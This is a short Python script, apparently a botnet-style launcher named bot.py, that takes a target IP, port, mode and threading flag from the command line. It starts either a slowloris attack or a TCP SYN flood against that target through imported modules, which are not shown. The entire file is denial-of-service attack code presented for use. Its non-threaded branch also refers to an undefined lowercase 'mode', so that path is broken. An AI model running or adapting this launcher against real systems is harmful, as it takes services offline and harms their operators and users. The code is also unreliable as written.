from __future__ import print_function
import rport
import slowloris as sls
import sys
import TCP_SYN_direct as tsd
import m_threading as mt
#
try:
	Target_IP = sys.argv[1]
	Target_Port = int(sys.argv[2])
	Mode = sys.argv[3]
	Multithreading = int(sys.argv[4])
	print("Target IP: {}".format(Target_IP))
	print("Target Port:{}".format(Target_Port))
	print("Mode:{}".format(Mode))
	print("Enable Multithreading:{}".format(Multithreading))
except IndexError:
	print("Input format incorrect.Run script as follow: python bot.py target_ip target_port mode enable_multithreading")



if Multithreading:
	mt.start_attack_in_multithreading(Mode,Target_IP,Target_Port)
else:
	if mode == 'slowloris':
		sls.start_slowloris(Target_IP,Target_Port,1000)
	if mode == 'tcp':
		tsd.TCP_SYN_direct(Target_IP,Target_Port)

